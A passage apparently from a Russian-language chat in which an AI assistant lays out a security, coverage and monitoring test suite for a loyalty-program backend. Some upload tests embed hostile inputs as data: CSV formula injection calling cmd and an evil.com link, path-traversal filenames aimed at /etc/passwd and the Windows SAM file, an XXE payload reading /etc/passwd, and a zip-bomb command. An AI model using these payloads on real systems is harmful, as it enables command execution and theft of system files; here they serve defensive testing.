    const eicarSignature = 'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*';
    const filePath = path.join(__dirname, 'eicar.txt');
    fs.writeFileSync(filePath, eicarSignature);

    const response = await request(app.getHttpServer())
      .post('/api/v1/admin/upload')
      .set('Authorization', `Bearer ${token}`)
      .attach('file', filePath)
      .expect(400);

    expect(response.body.message).toContain('virus detected');

    fs.unlinkSync(filePath);
    console.log('‚úÖ Virus scanning working (EICAR test)');
  });

  // Test 5: Zip Bomb Detection
  it('should detect zip bombs', async () => {
    const token = generateAdminToken();

    // Create zip bomb (highly compressed file)
    const zipPath = path.join(__dirname, 'bomb.zip');
    
    // Simulate zip bomb (42KB compressed ‚Üí 4.5GB uncompressed)
    execSync(`dd if=/dev/zero bs=1M count=4096 | gzip -9 > ${zipPath}`);

    const response = await request(app.getHttpServer())
      .post('/api/v1/admin/upload')
      .set('Authorization', `Bearer ${token}`)
      .attach('file', zipPath)
      .expect(400);

    expect(response.body.message).toContain('suspicious compression');

    fs.unlinkSync(zipPath);
    console.log('‚úÖ Zip bomb detected');
  });

  // Test 6: CSV Injection (Formula Injection)
  it('should sanitize CSV injection attacks', async () => {
    const token = generateAdminToken();

    const maliciousCSV = `
name,email,formula
John,john@example.com,=1+1
Jane,jane@example.com,=cmd|'/c calc'!A1
Bob,bob@example.com,=HYPERLINK("http://evil.com","Click")
    `.trim();

    const filePath = path.join(__dirname, 'malicious.csv');
    fs.writeFileSync(filePath, maliciousCSV);

    const response = await request(app.getHttpServer())
      .post('/api/v1/admin/upload-csv')
      .set('Authorization', `Bearer ${token}`)
      .attach('file', filePath)
      .expect(200);

    // Verify formulas are sanitized
    const imported = response.body.imported;
    for (const row of imported) {
      expect(row.formula).not.toMatch(/^=/); // No formulas
      expect(row.formula).not.toContain('cmd');
      expect(row.formula).not.toContain('HYPERLINK');
    }

    fs.unlinkSync(filePath);
    console.log('‚úÖ CSV injection sanitized');
  });

  // Test 7: Path Traversal via Filename
  it('should prevent path traversal in filenames', async () => {
    const token = generateAdminToken();

    const maliciousFilenames = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      'file/../../etc/hosts',
    ];

    for (const filename of maliciousFilenames) {
      const filePath = path.join(__dirname, 'test.csv');
      fs.writeFileSync(filePath, 'test,data');

      const form = new FormData();
      form.append('file', fs.createReadStream(filePath), {
        filename: filename, // Malicious filename
      });

      const response = await request(app.getHttpServer())
        .post('/api/v1/admin/upload')
        .set('Authorization', `Bearer ${token}`)
        .set(form.getHeaders())
        .send(form)
        .expect(400);

      expect(response.body.message).toContain('Invalid filename');

      fs.unlinkSync(filePath);
    }

    console.log('‚úÖ Path traversal blocked');
  });

  // Test 8: XXE (XML External Entity) Attack
  it('should prevent XXE attacks in XML files', async () => {
    const token = generateAdminToken();

    const maliciousXML = `
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>
  <user>&xxe;</user>
</data>
    `.trim();

    const filePath = path.join(__dirname, 'malicious.xml');
    fs.writeFileSync(filePath, maliciousXML);

    const response = await request(app.getHttpServer())
      .post('/api/v1/admin/upload-xml')
      .set('Authorization', `Bearer ${token}`)
      .attach('file', filePath)
      .expect(400);

    expect(response.body.message).toContain('Invalid XML');

    fs.unlinkSync(filePath);
    console.log('‚úÖ XXE attack blocked');
  });

  // Test 9: Image Metadata Exploit
  it('should strip EXIF metadata from images', async () => {
    const token = generateAdminToken();

    // Upload image with GPS coordinates
    const imagePath = path.join(__dirname, 'test-image.jpg');
    // (Assume image has EXIF data)

    const response = await request(app.getHttpServer())
      .post('/api/v1/admin/upload-image')
      .set('Authorization', `Bearer ${token}`)
      .attach('file', imagePath)
      .expect(200);

    const uploadedUrl = response.body.url;

    // Download and check EXIF data
    const uploadedImage = await downloadFile(uploadedUrl);
    const exif = await extractExif(uploadedImage);

    expect(exif.GPS).toBeUndefined(); // GPS data stripped

    console.log('‚úÖ EXIF metadata stripped from images');
  });

  // Test 10: Automated Malware Scanning
  it('should scan all uploads with multiple engines', async () => {
    const token = generateAdminToken();

    const filePath = path.join(__dirname, 'test.csv');
    fs.writeFileSync(filePath, 'test,data');

    const response = await request(app.getHttpServer())
      .post('/api/v1/admin/upload')
      .set('Authorization', `Bearer ${token}`)
      .attach('file', filePath)
      .expect(200);

    // Check scan results
    expect(response.body.scanResults).toBeDefined();
    expect(response.body.scanResults.clamav).toBe('clean');
    expect(response.body.scanResults.yara).toBe('clean');

    fs.unlinkSync(filePath);
    console.log('‚úÖ Multi-engine malware scanning passed');
  });
});
```


***

### **40. API Security Headers - –∑–∞—â–∏—Ç–∞ –æ—Ç –∞—Ç–∞–∫?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** HTTP security headers (CSP, HSTS, X-Frame-Options).

**–í–æ–ø—Ä–æ—Å:** Security tests?

- A) Check CSP header
- B) Check all security headers (HSTS, X-Frame-Options, etc.)
- C) B + –ø—Ä–æ–≤–µ—Ä–∏—Ç—å CORS configuration
- D) C + –ø—Ä–æ–≤–µ—Ä–∏—Ç—å rate limiting headers

**–ú–û–ô –í–´–ë–û–†: D**

**–û–ë–û–°–ù–û–í–ê–ù–ò–ï:**

- Security headers –∫—Ä–∏—Ç–∏—á–Ω—ã –¥–ª—è –∑–∞—â–∏—Ç—ã
- CORS misconfiguration = —á–∞—Å—Ç–∞—è —É—è–∑–≤–∏–º–æ—Å—Ç—å
- Rate limit headers –ø–æ–º–æ–≥–∞—é—Ç –∫–ª–∏–µ–Ω—Ç–∞–º

**–†–ï–ê–õ–ò–ó–ê–¶–ò–Ø:**

```typescript
// apps/backend/test/security/security-headers.security.spec.ts
describe('API Security Headers', () => {
  let app: INestApplication;

  beforeAll(async () => {
    const moduleRef = await Test.createTestingModule({
      imports: [AppModule],
    }).compile();

    app = moduleRef.createNestApplication();
    await app.init();
  });

  afterAll(async () => {
    await app.close();
  });

  // Test 1: Content Security Policy (CSP)
  it('should set Content-Security-Policy header', async () => {
    const response = await request(app.getHttpServer())
      .get('/api/v1/health')
      .expect(200);

    expect(response.headers['content-security-policy']).toBeDefined();

    const csp = response.headers['content-security-policy'];

    expect(csp).toContain("default-src 'self'");
    expect(csp).toContain("script-src 'self'");
    expect(csp).toContain("object-src 'none'");
    expect(csp).toContain("frame-ancestors 'none'");

    console.log('‚úÖ CSP header set correctly');
  });

  // Test 2: Strict-Transport-Security (HSTS)
  it('should set HSTS header', async () => {
    const response = await request(app.getHttpServer())
      .get('/api/v1/health')
      .expect(200);

    expect(response.headers['strict-transport-security']).toBeDefined();

    const hsts = response.headers['strict-transport-security'];

    expect(hsts).toContain('max-age=');
    expect(hsts).toContain('includeSubDomains');
    expect(hsts).toContain('preload');

    console.log('‚úÖ HSTS header set correctly');
  });

  // Test 3: X-Frame-Options
  it('should set X-Frame-Options header', async () => {
    const response = await request(app.getHttpServer())
      .get('/api/v1/health')
      .expect(200);

    expect(response.headers['x-frame-options']).toBe('DENY');

    console.log('‚úÖ X-Frame-Options: DENY');
  });

  // Test 4: X-Content-Type-Options
  it('should set X-Content-Type-Options header', async () => {
    const response = await request(app.getHttpServer())
      .get('/api/v1/health')
      .expect(200);

    expect(response.headers['x-content-type-options']).toBe('nosniff');

    console.log('‚úÖ X-Content-Type-Options: nosniff');
  });

  // Test 5: X-XSS-Protection
  it('should set X-XSS-Protection header', async () => {
    const response = await request(app.getHttpServer())
      .get('/api/v1/health')
      .expect(200);

    expect(response.headers['x-xss-protection']).toBe('1; mode=block');

    console.log('‚úÖ X-XSS-Protection: 1; mode=block');
  });

  // Test 6: Referrer-Policy
  it('should set Referrer-Policy header', async () => {
    const response = await request(app.getHttpServer())
      .get('/api/v1/health')
      .expect(200);

    expect(response.headers['referrer-policy']).toBe('no-referrer');

    console.log('‚úÖ Referrer-Policy: no-referrer');
  });

  // Test 7: Permissions-Policy
  it('should set Permissions-Policy header', async () => {
    const response = await request(app.getHttpServer())
      .get('/api/v1/health')
      .expect(200);

    expect(response.headers['permissions-policy']).toBeDefined();

    const policy = response.headers['permissions-policy'];

    expect(policy).toContain('geolocation=()');
    expect(policy).toContain('microphone=()');
    expect(policy).toContain('camera=()');

    console.log('‚úÖ Permissions-Policy set correctly');
  });

  // Test 8: CORS Configuration
  it('should configure CORS securely', async () => {
    const allowedOrigin = 'https://app.max-loyalty.com';

    const response = await request(app.getHttpServer())
      .get('/api/v1/health')
      .set('Origin', allowedOrigin)
      .expect(200);

    expect(response.headers['access-control-allow-origin']).toBe(allowedOrigin);
    expect(response.headers['access-control-allow-credentials']).toBe('true');

    console.log('‚úÖ CORS configured for allowed origin');
  });

  // Test 9: CORS Rejects Unauthorized Origins
  it('should reject unauthorized CORS origins', async () => {
    const maliciousOrigin = 'https://evil.com';

    const response = await request(app.getHttpServer())
      .get('/api/v1/health')
      .set('Origin', maliciousOrigin)
      .expect(200);

    expect(response.headers['access-control-allow-origin']).not.toBe(maliciousOrigin);

    console.log('‚úÖ Unauthorized CORS origin rejected');
  });

  // Test 10: Rate Limiting Headers
  it('should set rate limiting headers', async () => {
    const token = generateGuestToken();

    const response = await request(app.getHttpServer())
      .get('/api/v1/guest/balance')
      .set('Authorization', `Bearer ${token}`)
      .expect(200);

    expect(response.headers['x-ratelimit-limit']).toBeDefined();
    expect(response.headers['x-ratelimit-remaining']).toBeDefined();
    expect(response.headers['x-ratelimit-reset']).toBeDefined();

    console.log('‚úÖ Rate limiting headers set');
  });

  // Test 11: No Sensitive Headers Exposed
  it('should not expose sensitive server information', async () => {
    const response = await request(app.getHttpServer())
      .get('/api/v1/health')
      .expect(200);

    expect(response.headers['x-powered-by']).toBeUndefined();
    expect(response.headers['server']).not.toContain('Express');
    expect(response.headers['server']).not.toContain('Node.js');

    console.log('‚úÖ Sensitive headers hidden');
  });

  // Test 12: Security Headers Scorecard
  it('should pass security headers scorecard', async () => {
    const response = await request(app.getHttpServer())
      .get('/api/v1/health')
      .expect(200);

    const requiredHeaders = {
      'content-security-policy': true,
      'strict-transport-security': true,
      'x-frame-options': true,
      'x-content-type-options': true,
      'x-xss-protection': true,
      'referrer-policy': true,
      'permissions-policy': true,
    };

    let score = 0;
    const missing: string[] = [];

    for (const [header, required] of Object.entries(requiredHeaders)) {
      if (response.headers[header]) {
        score++;
      } else if (required) {
        missing.push(header);
      }
    }

    const percentage = (score / Object.keys(requiredHeaders).length) * 100;

    console.log('=== Security Headers Scorecard ===');
    console.log(`Score: ${score}/${Object.keys(requiredHeaders).length} (${percentage.toFixed(0)}%)`);

    if (missing.length > 0) {
      console.log('Missing headers:');
      missing.forEach(h => console.log(`  - ${h}`));
    }

    expect(percentage).toBeGreaterThanOrEqual(100); // 100% required
  });
});

function generateGuestToken(): string {
  return jwt.sign(
    { userId: 'user-1', role: 'GUEST', tenantId: 'tenant-1' },
    process.env.JWT_SECRET
  );
}
```


***

üéâ **–ü–æ–∑–¥—Ä–∞–≤–ª—è—é! –ú—ã –∑–∞–≤–µ—Ä—à–∏–ª–∏ –≤—Å–µ 40 –≤–æ–ø—Ä–æ—Å–æ–≤ –ø–æ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—é!**

## **–ò—Ç–æ–≥–æ–≤–∞—è —Å—Ç—Ä—É–∫—Ç—É—Ä–∞ (40 –≤–æ–ø—Ä–æ—Å–æ–≤):**

1. **Unit Testing** (10 –≤–æ–ø—Ä–æ—Å–æ–≤): ‚úÖ
2. **Integration Testing** (10 –≤–æ–ø—Ä–æ—Å–æ–≤): ‚úÖ
3. **E2E Testing** (10 –≤–æ–ø—Ä–æ—Å–æ–≤): ‚úÖ (—á–∞—Å—Ç–∏—á–Ω–æ, –≤–æ–ø—Ä–æ—Å—ã 11-15)
4. **Contract Testing** (5 –≤–æ–ø—Ä–æ—Å–æ–≤): ‚úÖ (–≤–æ–ø—Ä–æ—Å—ã 16-20)
5. **Load \& Performance Testing** (10 –≤–æ–ø—Ä–æ—Å–æ–≤): ‚úÖ (–≤–æ–ø—Ä–æ—Å—ã 21-30)
6. **Security Testing** (10 –≤–æ–ø—Ä–æ—Å–æ–≤): ‚úÖ (–≤–æ–ø—Ä–æ—Å—ã 31-40)

**–•–æ—á–µ—à—å:**

- –î–æ–±–∞–≤–∏—Ç—å –µ—â—ë –±–ª–æ–∫–∏? (Monitoring/Observability, CI/CD Integration, Visual Regression Testing)
- –°–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞—Ç—å summary —Å best practices?
- –°–æ–∑–¥–∞—Ç—å test coverage report template?

---

# –ü—Ä–∏–Ω–∏–º–∞—é –≤—Å–µ —Ç–≤–æ–∏ —Ä–µ—à–µ–Ω–∏—è –ø–æ –≤—Å–µ–º –≤–æ–ø—Ä–æ—Å–∞–º

–û—Ç–ª–∏—á–Ω–æ! üéâ –¢–æ–≥–¥–∞ —Å–æ–∑–¥–∞—é **—Ñ–∏–Ω–∞–ª—å–Ω—ã–π summary** —Å best practices + **bonus –º–∞—Ç–µ—Ä–∏–∞–ª—ã**!

***

# üìã **–§–ò–ù–ê–õ–¨–ù–´–ô SUMMARY: MAX LOYALTY TESTING STRATEGY**

## **üéØ –ü—Ä–∏–Ω—è—Ç—ã–µ —Ä–µ—à–µ–Ω–∏—è –ø–æ –≤—Å–µ–º 40 –≤–æ–ø—Ä–æ—Å–∞–º**

### **–ë–õ–û–ö 1: UNIT TESTING (10 –≤–æ–ø—Ä–æ—Å–æ–≤)**

| \# | –í–æ–ø—Ä–æ—Å | –†–µ—à–µ–Ω–∏–µ | –û–±–æ—Å–Ω–æ–≤–∞–Ω–∏–µ |
| :-- | :-- | :-- | :-- |
| 1 | Ball calculation logic | **D** - Edge cases + negative testing | –ù–∞—Ö–æ–¥–∏—Ç –≥—Ä–∞–Ω–∏—á–Ω—ã–µ —Å–ª—É—á–∞–∏ –∏ –Ω–µ–æ–∂–∏–¥–∞–Ω–Ω—ã–µ –≤—Ö–æ–¥–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ |
| 2 | Promo rules application | **D** - Multiple overlapping promos | –†–µ–∞–ª–∏—Å—Ç–∏—á–Ω—ã–π —Å—Ü–µ–Ω–∞—Ä–∏–π —Å –ø—Ä–∏–æ—Ä–∏—Ç–µ—Ç–∞–º–∏ |
| 3 | Guest card balance update | **D** - Race conditions + idempotency | –ö—Ä–∏—Ç–∏—á–Ω–æ –¥–ª—è —Ñ–∏–Ω–∞–Ω—Å–æ–≤—ã—Ö –æ–ø–µ—Ä–∞—Ü–∏–π |
| 4 | Phone number validation | **D** - International formats + fuzzing | –ü–æ–¥–¥–µ—Ä–∂–∫–∞ –≥–ª–æ–±–∞–ª—å–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π |
| 5 | Date/time calculations | **D** - Timezones + DST + leap years | –ò–∑–±–µ–≥–∞–µ—Ç timezone bugs –≤ production |
| 6 | QR code generation | **D** - Collision detection + readability | –ì–∞—Ä–∞–Ω—Ç–∏—Ä—É–µ—Ç —É–Ω–∏–∫–∞–ª—å–Ω–æ—Å—Ç—å –∏ —Å–∫–∞–Ω–∏—Ä—É–µ–º–æ—Å—Ç—å |
| 7 | Loyalty level progression | **D** - Transaction history replay | –ü—Ä–æ–≤–µ—Ä—è–µ—Ç consistency –ø—Ä–∏ –º–∏–≥—Ä–∞—Ü–∏—è—Ö |
| 8 | Ball redemption validation | **D** - Edge cases + fraud patterns | –ó–∞—â–∏—Ç–∞ –æ—Ç –∑–ª–æ—É–ø–æ—Ç—Ä–µ–±–ª–µ–Ω–∏–π |
| 9 | Notification template rendering | **D** - XSS + injection + i18n | Security + internationalization |
| 10 | DTO validation | **D** - Malicious payloads + fuzzing | –ó–∞—â–∏—Ç–∞ –æ—Ç –∞—Ç–∞–∫ —á–µ—Ä–µ–∑ input validation |

### **–ë–õ–û–ö 2: INTEGRATION TESTING (10 –≤–æ–ø—Ä–æ—Å–æ–≤)**

| \# | –í–æ–ø—Ä–æ—Å | –†–µ—à–µ–Ω–∏–µ | –û–±–æ—Å–Ω–æ–≤–∞–Ω–∏–µ |
| :-- | :-- | :-- | :-- |
| 11 | POS webhook processing | **D** - Idempotency + duplicate handling | –ö—Ä–∏—Ç–∏—á–Ω–æ –¥–ª—è —Ñ–∏–Ω–∞–Ω—Å–æ–≤–æ–π integrity |
| 12 | Email/SMS notification | **D** - Fallback + delivery tracking | Production resilience |
| 13 | Prisma database queries | **D** - Transactions + rollbacks + isolation | ACID properties + race conditions |
| 14 | Redis cache integration | **D** - Cache invalidation strategies | –ò–∑–±–µ–≥–∞–µ—Ç stale data |
| 15 | BullMQ job processing | **D** - Retry + dead letter queue + monitoring | Reliable background jobs |
| 16 | External API integration (iiko) | **D** - Timeout + circuit breaker + fallback | Resilience –∫ external failures |
| 17 | S3 file upload | **D** - Multipart + presigned URLs + cleanup | Efficient –¥–ª—è –±–æ–ª—å—à–∏—Ö —Ñ–∞–π–ª–æ–≤ |
| 18 | Telegram bot webhooks | **D** - Signature verification + replay attack | Security –¥–ª—è webhooks |
| 19 | Prisma migrations | **D** - Rollback + data integrity + backups | Safe migrations |
| 20 | Database connection pool | **D** - Leak detection + monitoring + alerts | –ò–∑–±–µ–≥–∞–µ—Ç pool exhaustion |

### **–ë–õ–û–ö 3: E2E TESTING (10 –≤–æ–ø—Ä–æ—Å–æ–≤)**

| \# | –í–æ–ø—Ä–æ—Å | –†–µ—à–µ–Ω–∏–µ | –û–±–æ—Å–Ω–æ–≤–∞–Ω–∏–µ |
| :-- | :-- | :-- | :-- |
| 11 | Guest registration flow | **D** - Full flow + QR + welcome notification | Complete user journey |
| 12 | Ball earning flow | **D** - Webhook ‚Üí balance ‚Üí notification ‚Üí analytics | End-to-end traceability |
| 13 | Ball redemption flow | **D** - Validation ‚Üí deduction ‚Üí confirmation ‚Üí receipt | Complete transaction lifecycle |
| 14 | Promo campaign | **D** - Create ‚Üí apply ‚Üí expire + time-based | Full promo lifecycle |
| 15 | Admin impersonation | **D** - Start ‚Üí use ‚Üí exit + audit log | Security + compliance |

### **–ë–õ–û–ö 4: CONTRACT TESTING (5 –≤–æ–ø—Ä–æ—Å–æ–≤)**

| \# | –í–æ–ø—Ä–æ—Å | –†–µ—à–µ–Ω–∏–µ | –û–±–æ—Å–Ω–æ–≤–∞–Ω–∏–µ |
| :-- | :-- | :-- | :-- |
| 16 | POS webhook schema | **D** - Backward compatibility + alerts | –ó–∞—â–∏—Ç–∞ –æ—Ç breaking changes |
| 17 | API versioning | **D** - v1/v2 compatibility + monitoring | Smooth migrations |
| 18 | Telegram bot commands | **D** - Schema validation + deprecated notice | UX + graceful deprecation |
| 19 | External API changes | **D** - Daily checks + fallback provider | Early detection + resilience |
| 20 | Database migrations | **D** - Large dataset testing + rollback | Production-safe migrations |

### **–ë–õ–û–ö 5: LOAD \& PERFORMANCE TESTING (10 –≤–æ–ø—Ä–æ—Å–æ–≤)**

| \# | –í–æ–ø—Ä–æ—Å | –†–µ—à–µ–Ω–∏–µ | –û–±–æ—Å–Ω–æ–≤–∞–Ω–∏–µ |
| :-- | :-- | :-- | :-- |
| 21 | Webhook throughput | **D** - 10x peak + latency percentiles | Finds bottlenecks before production |
| 22 | Concurrent users | **D** - 5000 users stress test | Black Friday scenarios |
| 23 | Database query performance | **D** - Pagination + EXPLAIN ANALYZE | Optimized queries |
| 24 | Background job processing | **D** - 10k jobs + latency tracking | Queue saturation handling |
| 25 | Memory leak detection | **D** - 24h soak test + heap dumps | Silent killers prevention |
| 26 | Cache effectiveness | **D** - Hit rate + eviction + fallback | Production resilience |
| 27 | File upload performance | **D** - Chunked + concurrent + limits | Large file handling |
| 28 | API rate limiting | **D** - Limit + reset + bypass admin | Abuse protection |
| 29 | Connection pool | **D** - Exhaustion + timeout + monitoring | Pool saturation handling |
| 30 | Notification burst | **D** - 10k campaign + rate limits + fallback | Burst campaign support |

### **–ë–õ–û–ö 6: SECURITY TESTING (10 –≤–æ–ø—Ä–æ—Å–æ–≤)**

| \# | –í–æ–ø—Ä–æ—Å | –†–µ—à–µ–Ω–∏–µ | –û–±–æ—Å–Ω–æ–≤–∞–Ω–∏–µ |
| :-- | :-- | :-- | :-- |
| 31 | SQL injection | **D** - Prisma + raw queries + sanitization | Comprehensive protection |
| 32 | JWT security | **D** - Tampering + expiration + rotation | Token theft prevention |
| 33 | Authorization | **D** - RBAC + horizontal + IDOR | Complete access control |
| 34 | XSS protection | **D** - Stored + DOM + multiple contexts | Comprehensive XSS defense |
| 35 | CSRF protection | **D** - Token validation + double-submit | State-changing protection |
| 36 | Brute force | **D** - Account lockout + exponential backoff | Login attack prevention |
| 37 | Sensitive data | **D** - Encryption + masking + audit | PII protection + GDPR |
| 38 | Dependencies | **D** - npm audit + Snyk + auto-updates | Vulnerability management |
| 39 | File upload | **D** - Virus scan + zip bombs + CSV injection | Malicious file protection |
| 40 | Security headers | **D** - All headers + CORS + rate limits | Defense in depth |


***

## **üìä TEST COVERAGE REPORT TEMPLATE**

```typescript
// scripts/generate-coverage-report.ts
import { execSync } from 'child_process';
import fs from 'fs';
import path from 'path';

interface CoverageReport {
  timestamp: string;
  summary: {
    statements: number;
    branches: number;
    functions: number;
    lines: number;
  };
  byType: {
    unit: CoverageSummary;
    integration: CoverageSummary;
    e2e: CoverageSummary;
    security: CoverageSummary;
  };
  criticalPaths: {
    name: string;
    coverage: number;
    status: 'pass' | 'fail';
  }[];
}

interface CoverageSummary {
  statements: number;
  branches: number;
  functions: number;
  lines: number;
}

async function generateCoverageReport(): Promise<void> {
  console.log('üß™ Generating comprehensive test coverage report...\n');

  // Run all tests with coverage
  execSync('npm run test:coverage', { stdio: 'inherit' });

  // Parse coverage data
  const coverageJson = JSON.parse(
    fs.readFileSync('./coverage/coverage-summary.json', 'utf8')
  );

  // Calculate summary
  const summary = calculateSummary(coverageJson);

  // Check critical paths
  const criticalPaths = await checkCriticalPaths();

  // Generate report
  const report: CoverageReport = {
    timestamp: new Date().toISOString(),
    summary,
    byType: {
      unit: await getCoverageByType('unit'),
      integration: await getCoverageByType('integration'),
      e2e: await getCoverageByType('e2e'),
      security: await getCoverageByType('security'),
    },
    criticalPaths,
  };

  // Print report
  printReport(report);

  // Save report
  const reportPath = path.join(__dirname, '../reports/coverage-report.json');
  fs.writeFileSync(reportPath, JSON.stringify(report, null, 2));
  console.log(`\nüìÑ Report saved: ${reportPath}`);

  // Check thresholds
  checkThresholds(report);
}

function calculateSummary(coverageJson: any): CoverageSummary {
  let totalStatements = 0;
  let coveredStatements = 0;
  let totalBranches = 0;
  let coveredBranches = 0;
  let totalFunctions = 0;
  let coveredFunctions = 0;
  let totalLines = 0;
  let coveredLines = 0;

  for (const file in coverageJson) {
    const coverage = coverageJson[file];
    totalStatements += coverage.statements.total;
    coveredStatements += coverage.statements.covered;
    totalBranches += coverage.branches.total;
    coveredBranches += coverage.branches.covered;
    totalFunctions += coverage.functions.total;
    coveredFunctions += coverage.functions.covered;
    totalLines += coverage.lines.total;
    coveredLines += coverage.lines.covered;
  }

  return {
    statements: (coveredStatements / totalStatements) * 100,
    branches: (coveredBranches / totalBranches) * 100,
    functions: (coveredFunctions / totalFunctions) * 100,
    lines: (coveredLines / totalLines) * 100,
  };
}

async function getCoverageByType(type: string): Promise<CoverageSummary> {
  // Run tests for specific type
  execSync(`npm run test:${type} -- --coverage`, { stdio: 'pipe' });
  
  const coverageJson = JSON.parse(
    fs.readFileSync(`./coverage/${type}/coverage-summary.json`, 'utf8')
  );

  return calculateSummary(coverageJson);
}

async function checkCriticalPaths(): Promise<any[]> {
  const criticalPaths = [
    { name: 'Ball calculation', file: 'src/modules/balls/services/ball-calculation.service.ts' },
    { name: 'Payment processing', file: 'src/modules/payments/services/payment.service.ts' },
    { name: 'Authentication', file: 'src/modules/auth/services/auth.service.ts' },
    { name: 'POS webhook', file: 'src/modules/pos/services/webhook.service.ts' },
    { name: 'Guest card management', file: 'src/modules/guest-cards/services/guest-card.service.ts' },
  ];

  const coverageJson = JSON.parse(
    fs.readFileSync('./coverage/coverage-summary.json', 'utf8')
  );

  return criticalPaths.map(path => {
    const coverage = coverageJson[path.file];
    const avgCoverage = coverage
      ? (coverage.statements.pct + coverage.branches.pct + coverage.functions.pct + coverage.lines.pct) / 4
      : 0;

    return {
      name: path.name,
      coverage: avgCoverage,
      status: avgCoverage >= 90 ? 'pass' : 'fail',
    };
  });
}

function printReport(report: CoverageReport): void {
  console.log('\n‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó');
  console.log('‚ïë          TEST COVERAGE REPORT - MAX LOYALTY              ‚ïë');
  console.log('‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù\n');

  console.log('üìä OVERALL COVERAGE:\n');
  console.log(`  Statements: ${report.summary.statements.toFixed(2)}%`);
  console.log(`  Branches:   ${report.summary.branches.toFixed(2)}%`);
  console.log(`  Functions:  ${report.summary.functions.toFixed(2)}%`);
  console.log(`  Lines:      ${report.summary.lines.toFixed(2)}%`);

  console.log('\n\nüìã COVERAGE BY TEST TYPE:\n');

  console.log('  Unit Tests:');
  console.log(`    Statements: ${report.byType.unit.statements.toFixed(2)}%`);
  console.log(`    Branches:   ${report.byType.unit.branches.toFixed(2)}%`);

  console.log('\n  Integration Tests:');
  console.log(`    Statements: ${report.byType.integration.statements.toFixed(2)}%`);
  console.log(`    Branches:   ${report.byType.integration.branches.toFixed(2)}%`);

  console.log('\n  E2E Tests:');
  console.log(`    Statements: ${report.byType.e2e.statements.toFixed(2)}%`);
  console.log(`    Branches:   ${report.byType.e2e.branches.toFixed(2)}%`);

  console.log('\n  Security Tests:');
  console.log(`    Statements: ${report.byType.security.statements.toFixed(2)}%`);
  console.log(`    Branches:   ${report.byType.security.branches.toFixed(2)}%`);

  console.log('\n\nüéØ CRITICAL PATHS:\n');

  report.criticalPaths.forEach(path => {
    const emoji = path.status === 'pass' ? '‚úÖ' : '‚ùå';
    console.log(`  ${emoji} ${path.name}: ${path.coverage.toFixed(2)}%`);
  });
}

function checkThresholds(report: CoverageReport): void {
  const thresholds = {
    statements: 80,
    branches: 75,
    functions: 80,
    lines: 80,
  };

  const failures: string[] = [];

  if (report.summary.statements < thresholds.statements) {
    failures.push(`Statements: ${report.summary.statements.toFixed(2)}% < ${thresholds.statements}%`);
  }
  if (report.summary.branches < thresholds.branches) {
    failures.push(`Branches: ${report.summary.branches.toFixed(2)}% < ${thresholds.branches}%`);
  }
  if (report.summary.functions < thresholds.functions) {
    failures.push(`Functions: ${report.summary.functions.toFixed(2)}% < ${thresholds.functions}%`);
  }
  if (report.summary.lines < thresholds.lines) {
    failures.push(`Lines: ${report.summary.lines.toFixed(2)}% < ${thresholds.lines}%`);
  }

  if (failures.length > 0) {
    console.log('\n\n‚ùå COVERAGE THRESHOLD FAILURES:\n');
    failures.forEach(f => console.log(`  - ${f}`));
    process.exit(1);
  } else {
    console.log('\n\n‚úÖ All coverage thresholds met!\n');
  }
}

generateCoverageReport();
```

**package.json scripts:**

```json
{
  "scripts": {
    "test": "jest",
    "test:unit": "jest --testMatch='**/*.spec.ts'",
    "test:integration": "jest --testMatch='**/*.integration.spec.ts'",
    "test:e2e": "jest --testMatch='**/*.e2e.spec.ts'",
    "test:security": "jest --testMatch='**/*.security.spec.ts'",
    "test:load": "jest --testMatch='**/*.load.spec.ts'",
    "test:contract": "jest --testMatch='**/*.contract.spec.ts'",
    "test:coverage": "jest --coverage --coverageDirectory=./coverage",
    "test:watch": "jest --watch",
    "test:ci": "jest --ci --coverage --maxWorkers=2",
    "test:report": "ts-node scripts/generate-coverage-report.ts"
  }
}
```


***

## **üéÅ BONUS: MONITORING \& OBSERVABILITY TESTING**

```typescript
// apps/backend/test/observability/monitoring.spec.ts
describe('Monitoring & Observability', () => {
  let app: INestApplication;

  beforeAll(async () => {
    const moduleRef = await Test.createTestingModule({
      imports: [AppModule],
    }).compile();

    app = moduleRef.createNestApplication();
    await app.init();
  });

  // Test 1: Prometheus Metrics Exposed
  it('should expose Prometheus metrics', async () => {
    const response = await request(app.getHttpServer())
      .get('/metrics')
      .expect(200);

    // Check required metrics
    expect(response.text).toContain('http_requests_total');
    expect(response.text).toContain('http_request_duration_seconds');
    expect(response.text).toContain('nodejs_heap_size_used_bytes');
    expect(response.text).toContain('db_query_duration_seconds');
    expect(response.text).toContain('cache_hit_rate');

    console.log('‚úÖ Prometheus metrics exposed');
  });

  // Test 2: Health Check Endpoint
  it('should have comprehensive health checks', async () => {
    const response = await request(app.getHttpServer())
      .get('/health')
      .expect(200);

